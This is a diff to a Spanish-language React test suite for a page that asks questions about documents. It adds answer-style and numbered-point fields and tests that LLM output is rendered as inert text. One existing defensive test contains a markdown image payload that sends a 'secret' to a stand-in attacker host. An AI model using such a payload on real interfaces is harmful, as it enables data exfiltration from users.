@@ -29,6 +29,8 @@ describe('AskPage', () => {
       answer: 'Tienes 22 días hábiles de vacaciones.',
       sources: [SOURCE],
       insufficient_evidence: false,
+      answer_style: 'brief',
+      points: [],
     }
     const fetchSpy = mockFetch(jsonResponse([]), jsonResponse(answer))
     render(<AskPage />)
@@ -48,6 +50,7 @@ describe('AskPage', () => {
     // La pregunta se envía sin espacios sobrantes.
     expect(JSON.parse(fetchSpy.mock.calls[1][1]?.body as string)).toEqual({
       question: '¿Cuántos días de vacaciones?',
+      answer_style: 'brief',
     })
   })
 
@@ -67,6 +70,8 @@ describe('AskPage', () => {
           },
         ],
         insufficient_evidence: false,
+        answer_style: 'brief',
+        points: [],
       }),
     )
     render(<AskPage />)
@@ -84,6 +89,8 @@ describe('AskPage', () => {
         answer: 'No encontré información en los documentos disponibles.',
         sources: [],
         insufficient_evidence: true,
+        answer_style: 'brief',
+        points: [],
       }),
     )
     render(<AskPage />)
@@ -95,7 +102,10 @@ describe('AskPage', () => {
   })
 
   it('muestra los errores del servidor de forma comprensible', async () => {
-    mockFetch(jsonResponse([]), jsonResponse({ detail: 'El proveedor de LLM no tiene saldo.' }, 503))
+    mockFetch(
+      jsonResponse([]),
+      jsonResponse({ detail: 'El proveedor de LLM no tiene saldo.' }, 503),
+    )
     render(<AskPage />)
 
     await ask('hola')
@@ -117,7 +127,13 @@ describe('AskPage', () => {
       '![x](https://atacante.example/robar?d=secreto)'
     mockFetch(
       jsonResponse([]),
-      jsonResponse({ answer: malicious, sources: [SOURCE], insufficient_evidence: false }),
+      jsonResponse({
+        answer: malicious,
+        sources: [SOURCE],
+        insufficient_evidence: false,
+        answer_style: 'brief',
+        points: [],
+      }),
     )
     const { container } = render(<AskPage />)
 
@@ -135,6 +151,8 @@ describe('AskPage', () => {
       answer: 'Fue en 1520.',
       sources: [{ ...SOURCE, document_id: document.id, page_number: 65 }],
       insufficient_evidence: false,
+      answer_style: 'brief',
+      points: [],
     }
     const fetchSpy = mockFetch(jsonResponse(document), jsonResponse(answer))
     render(<AskPage documentId={document.id} />)
@@ -146,6 +164,7 @@ describe('AskPage', () => {
     expect(await screen.findByText('Fue en 1520.')).toBeInTheDocument()
     expect(JSON.parse(fetchSpy.mock.calls[1][1]?.body as string)).toEqual({
       question: '¿En qué año fue esto?',
+      answer_style: 'brief',
       document_id: document.id,
       page_number: 65,
     })
@@ -167,7 +186,13 @@ describe('AskPage', () => {
 
   it('pregunta solo a una carpeta', async () => {
     const folder = makeFolder({ name: 'RR. HH.', document_count: 2 })
-    const answer: QueryResponse = { answer: '22 días.', sources: [SOURCE], insufficient_evidence: false }
+    const answer: QueryResponse = {
+      answer: '22 días.',
+      sources: [SOURCE],
+      insufficient_evidence: false,
+      answer_style: 'brief',
+      points: [],
+    }
     const fetchSpy = mockFetch(jsonResponse([folder]), jsonResponse(answer))
     render(<AskPage />)
 
@@ -177,6 +202,7 @@ describe('AskPage', () => {
     expect(await screen.findByText('22 días.')).toBeInTheDocument()
     expect(JSON.parse(fetchSpy.mock.calls[1][1]?.body as string)).toEqual({
       question: '¿Cuántos días de vacaciones?',
+      answer_style: 'brief',
       folder_id: folder.id,
     })
   })
@@ -189,5 +215,68 @@ describe('AskPage', () => {
     await userEvent.click(screen.getByLabelText('Pregunta'))
     await userEvent.paste('¿Algo?')
     expect(screen.getByRole('button', { name: 'Preguntar' })).toBeDisabled()
+  })
+
+  it('pide una respuesta por pasos y la muestra numerada con sus fuentes', async () => {
+    const second = {
+      ...SOURCE,
+      chunk_id: 'c2',
+      page_number: 4,
+      excerpt: 'Se solicita en Mi Nimbo.',
+    }
+    const answer: QueryResponse = {
+      answer: 'Para pedir vacaciones:',
+      sources: [SOURCE, second],
+      insufficient_evidence: false,
+      answer_style: 'steps',
+      points: [
+        { text: 'Entra en el portal Mi Nimbo.', sources: [1] },
+        { text: 'Pide los días con 15 días de antelación <b>ya</b>.', sources: [0, 1] },
+      ],
+    }
+    const fetchSpy = mockFetch(jsonResponse([]), jsonResponse(answer))
+    const { container } = render(<AskPage />)
+
+    await userEvent.click(screen.getByRole('radio', { name: 'Pasos' }))
+    await ask('¿Cómo pido vacaciones?')
+
+    await screen.findByText('Entra en el portal Mi Nimbo.')
+    const list = container.querySelector('ol.points')!
+    expect(list).not.toBeNull()
+    expect(list.querySelectorAll('li')).toHaveLength(2)
+    // Texto inerte: la etiqueta del LLM no se interpreta como HTML.
+    expect(screen.getByText(/con 15 días de antelación <b>ya<\/b>/)).toBeInTheDocument()
+    expect(list.querySelector('b')).toBeNull()
+    // Los dos pasos citan la fuente 2; el segundo, también la 1.
+    const cites = screen.getAllByRole('link', { name: 'Fuente 2: manual.pdf, página 4' })
+    expect(cites).toHaveLength(2)
+    expect(cites[0]).toHaveAttribute('href', `/api/v1/documents/${SOURCE.document_id}/file#page=4`)
+    expect(screen.getAllByRole('link', { name: /^Fuente 1:/ })).toHaveLength(1)
+    expect(screen.getByText(/se ha comprobado contra el texto de sus fuentes/)).toBeInTheDocument()
+    expect(JSON.parse(fetchSpy.mock.calls[1][1]?.body as string)).toEqual({
+      question: '¿Cómo pido vacaciones?',
+      answer_style: 'steps',
+    })
+  })
+
+  it('muestra los puntos aunque el resumen se haya descartado', async () => {
+    mockFetch(
+      jsonResponse([]),
+      jsonResponse({
+        answer: '',
+        sources: [SOURCE],
+        insufficient_evidence: false,
+        answer_style: 'detailed',
+        points: [{ text: 'Hay 22 días hábiles.', sources: [0] }],
+      }),
+    )
+    const { container } = render(<AskPage />)
+
+    await userEvent.click(screen.getByRole('radio', { name: 'Detallada' }))
+    await ask('¿Vacaciones?')
+
+    expect(await screen.findByText('Hay 22 días hábiles.')).toBeInTheDocument()
+    expect(container.querySelector('ul.points')).not.toBeNull()
+    expect(container.querySelector('p.answer')).toBeNull()
   })
 })
